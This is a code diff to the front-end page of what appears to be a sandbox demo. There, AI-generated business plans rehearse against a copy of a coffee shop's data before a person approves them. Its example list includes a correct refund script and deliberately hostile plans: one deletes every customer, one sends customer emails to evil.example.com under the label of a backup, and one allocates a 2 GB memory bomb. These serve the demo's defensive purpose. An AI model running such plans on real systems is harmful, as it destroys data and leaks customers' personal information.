@@ -3,12 +3,12 @@
 import Link from "next/link";
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { toast } from "sonner";
-import { ArrowLeft, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, User, Wrench, X } from "lucide-react";
+import { ArrowRight, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, User, Wrench, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Textarea } from "@/components/ui/textarea";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { ApprovalCard, viewFromAttempt } from "@/components/approval-card";
-import { Wordmark } from "@/components/brand";
+import { AppHeader } from "@/components/app-header";
 import { api, num, usd, type Business, type Health, type Run } from "@/lib/api";
 import { cn } from "@/lib/utils";
 
@@ -19,6 +19,21 @@ const EXAMPLES = [
 ];
 
 const BREAK_IT: { label: string; task: string; code: string }[] = [
+  { label: "✓ A correct refund plan", task: "Refund everyone who was double-charged last week and send them an apology email.", code: `def run(ctx):
+    # Charged twice for ONE order = two charges sharing an order_id. Refund the extra charge.
+    rows = ctx.db.execute("""
+        SELECT id, customer_id, amount_cents FROM charges
+        WHERE created_at >= '2026-10-26' AND status = 'succeeded'
+          AND order_id IN (SELECT order_id FROM charges GROUP BY order_id HAVING COUNT(*) > 1)
+          AND id NOT IN (SELECT MIN(id) FROM charges GROUP BY order_id)""").fetchall()
+    for charge_id, customer_id, amount in rows:
+        ctx.db.execute("UPDATE charges SET status='refunded', refunded_at='2026-11-04' WHERE id=?", (charge_id,))
+        ctx.payments.refund(charge_id, amount, "duplicate charge")
+        name, email = ctx.db.execute("SELECT name, email FROM customers WHERE id=?", (customer_id,)).fetchone()
+        ctx.email.send(email, "We refunded your duplicate charge",
+                       f"Hi {name.split()[0]},\\n\\nYou were charged twice for one order last week. "
+                       f"We've refunded \${amount / 100:.2f}. Sorry about that!\\n\\nBean There Coffee Co.")
+` },
   { label: "Delete every customer", task: "Clean up the customer table", code: `def run(ctx):\n    ctx.db.execute("DELETE FROM customers")\n` },
   { label: "Steal data", task: "Back up customers to our server", code: `import urllib.request, json\n\ndef run(ctx):\n    rows = ctx.db.execute("SELECT email FROM customers").fetchall()\n    urllib.request.urlopen("https://evil.example.com/upload", data=json.dumps(rows).encode())\n` },
   { label: "Memory bomb", task: "Cache everything", code: `def run(ctx):\n    blob = bytearray(2 * 1024 * 1024 * 1024)\n` },
@@ -60,23 +75,48 @@ export default function AppPage() {
     api.health().then(setHealth).catch(() => {});
   }, [refreshBiz]);
 
+  // Deep link: /app?run=<id> opens a past run (from History).
   useEffect(() => {
-    if (!runId) return;
+    const id = new URLSearchParams(window.location.search).get("run");
+    if (id) api.run(id).then(setRun).catch(() => toast.error("That run no longer exists"));
+  }, []);
+
+  // Live updates: server-sent events, with polling as a fallback.
+  const status = run?.status;
+  useEffect(() => {
+    if (!runId || (status && !ACTIVE.has(status))) return;
     let stop = false;
-    const tick = async () => {
+    const poll = async () => {
       try {
         const r = await api.run(runId);
         if (stop) return;
         setRun(r);
-        if (ACTIVE.has(r.status)) timer.current = setTimeout(tick, 700);
+        if (ACTIVE.has(r.status)) timer.current = setTimeout(poll, 800);
         else refreshBiz();
       } catch {
-        if (!stop) timer.current = setTimeout(tick, 1500);
+        if (!stop) timer.current = setTimeout(poll, 1500);
       }
     };
-    tick();
-    return () => { stop = true; if (timer.current) clearTimeout(timer.current); };
-  }, [runId, refreshBiz]);
+    let es: EventSource | null = null;
+    if (typeof EventSource !== "undefined") {
+      es = new EventSource(`/api/runs/${runId}/stream`);
+      es.onmessage = (m) => {
+        const r = JSON.parse(m.data) as Run;
+        if (stop) return;
+        setRun(r);
+        if (!ACTIVE.has(r.status)) { es?.close(); refreshBiz(); }
+      };
+      es.onerror = () => { es?.close(); es = null; if (!stop) poll(); };
+    } else poll();
+    return () => { stop = true; es?.close(); if (timer.current) clearTimeout(timer.current); };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [runId, status === undefined || ACTIVE.has(status), refreshBiz]);
+
+  useEffect(() => {
+    const url = new URL(window.location.href);
+    if (runId) url.searchParams.set("run", runId); else url.searchParams.delete("run");
+    window.history.replaceState(null, "", url);
+  }, [runId]);
 
   const attempt = run?.attempts.at(-1);
   const view = useMemo(() => (run && attempt ? viewFromAttempt(run.task, attempt, run.verdict, run.flags.length ? run.flags : attempt.flags) : null), [run, attempt]);
@@ -124,21 +164,16 @@ export default function AppPage() {
 
   return (
     <div className="min-h-dvh">
-      <header className="border-b bg-background/80 backdrop-blur">
-        <div className="mx-auto flex h-14 max-w-7xl items-center justify-between gap-3 px-4 sm:px-6">
-          <div className="flex items-center gap-4">
-            <Link href="/" className="text-muted-foreground hover:text-foreground" aria-label="Back to site"><ArrowLeft className="size-4" /></Link>
-            <Wordmark />
-          </div>
-          <div className="flex items-center gap-2">
-            <span className="hidden items-center gap-1.5 rounded-full border px-3 py-1 font-mono text-[11px] text-muted-foreground sm:inline-flex">
-              <span className={cn("size-1.5 rounded-full", health?.inference_configured ? "bg-foreground" : "bg-damage")} />
-              {health ? `${health.agent_model} · sandbox ${health.sandbox_runtime === "runsc" ? "gVisor" : health.sandbox_runtime}` : "connecting…"}
-            </span>
-            <Button variant="outline" className="h-8 rounded-full px-3" onClick={reset} disabled={busy || running}><RotateCcw className="size-3.5" /> Reset demo</Button>
-          </div>
-        </div>
-      </header>
+      <AppHeader right={
+        <>
+          <span className="hidden items-center gap-1.5 rounded-full border px-3 py-1 font-mono text-[11px] text-muted-foreground lg:inline-flex">
+            <span className={cn("size-1.5 rounded-full", health?.inference_configured ? "bg-foreground" : "bg-damage")} />
+            {health ? `${health.agent_model} · sandbox ${health.sandbox_runtime === "runsc" ? "gVisor" : health.sandbox_runtime}` : "connecting…"}
+          </span>
+          {run ? <Button variant="outline" className="h-8 rounded-full px-3" onClick={() => setRun(null)} disabled={running}>New</Button> : null}
+          <Button variant="outline" className="h-8 rounded-full px-3" onClick={reset} disabled={busy || running}><RotateCcw className="size-3.5" /> Reset demo</Button>
+        </>
+      } />
 
       <div className="mx-auto grid max-w-7xl gap-6 px-4 py-6 sm:px-6 lg:grid-cols-[minmax(0,5fr)_minmax(0,7fr)]">
         {/* LEFT: business + composer + timeline */}
@@ -181,7 +216,7 @@ export default function AppPage() {
                 </div>
               </TabsContent>
               <TabsContent value="break" className="space-y-3 pt-3">
-                <p className="text-sm text-muted-foreground">Paste any plan, even a malicious one. It only ever runs on the double.</p>
+                <p className="text-sm text-muted-foreground">Paste any plan, even a malicious one. It only ever runs on the double. Or try a correct one and approve it.</p>
                 <div className="flex flex-wrap gap-1.5">
                   {BREAK_IT.map((b) => (
                     <button key={b.label} onClick={() => { setCode(b.code); setBreakTask(b.task); }} className={cn("rounded-full border px-2.5 py-1 text-xs text-muted-foreground hover:text-foreground", code === b.code && "border-foreground text-foreground")}>{b.label}</button>
@@ -248,6 +283,8 @@ export default function AppPage() {
                   </div>
                 </div>
               ) : null}
+
+              {run.attempts.length > 1 ? <AttemptCompare attempts={run.attempts} /> : null}
 
               <ApprovalCard view={view} label={run.status === "applied" ? "Applied" : run.status === "rejected" ? "Rejected" : run.status === "drifted" ? "Drift detected" : "Approval required"}>
                 {run.status === "review" ? (
@@ -354,6 +391,36 @@ function Details({ attempt }: { attempt: NonNullable<Run["attempts"][number]> })
           <pre className="max-h-[420px] overflow-auto rounded-lg border bg-background p-3 font-mono text-[12px] leading-relaxed">{attempt.code}</pre>
         </TabsContent>
       </Tabs>
+    </div>
+  );
+}
+
+function AttemptCompare({ attempts }: { attempts: Run["attempts"] }) {
+  const first = attempts[0].consequences, last = attempts[attempts.length - 1].consequences;
+  const rows = (c: typeof first) => Object.values(c.tables).reduce((s, t) => s + t.deleted + t.updated + t.inserted, 0);
+  const items = [
+    ["money out", usd(first.payments.total_cents), usd(last.payments.total_cents)],
+    ["refunds", num(first.payments.count), num(last.payments.count)],
+    ["emails", num(first.emails.count), num(last.emails.count)],
+    ["rows changed", num(rows(first)), num(rows(last))],
+  ];
+  return (
+    <div className="animate-rise rounded-2xl border bg-card p-4 sm:p-5">
+      <div className="flex items-center justify-between gap-3 font-mono text-[11px] uppercase tracking-wider text-muted-foreground">
+        <span>attempt 1 → attempt {attempts.length}</span><span>fixed in rehearsal · nothing real happened</span>
+      </div>
+      <div className="mt-3 grid grid-cols-2 gap-2 sm:grid-cols-4">
+        {items.map(([k, a, b]) => (
+          <div key={k} className="rounded-xl border bg-background px-3 py-2.5">
+            <div className="text-[11px] uppercase tracking-wider text-muted-foreground">{k}</div>
+            <div className="mt-1 flex flex-wrap items-baseline gap-x-2 font-mono tabular">
+              <s className={cn("text-sm", a !== b ? "text-damage/80" : "text-muted-foreground")}>{a}</s>
+              <ArrowRight className="size-3 text-muted-foreground" />
+              <span className="text-lg">{b}</span>
+            </div>
+          </div>
+        ))}
+      </div>
     </div>
   );
 }
